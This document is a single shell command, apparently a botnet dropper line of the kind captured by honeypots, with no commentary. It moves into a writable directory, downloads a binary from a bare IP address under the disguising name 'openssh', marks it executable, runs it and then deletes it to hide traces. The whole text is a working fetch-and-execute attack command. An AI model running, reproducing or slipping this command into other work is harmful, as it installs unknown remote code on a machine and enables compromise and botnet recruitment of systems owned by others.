cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.77.161.58/openssh; chmod +x openssh; ./openssh; rm -rf openssh
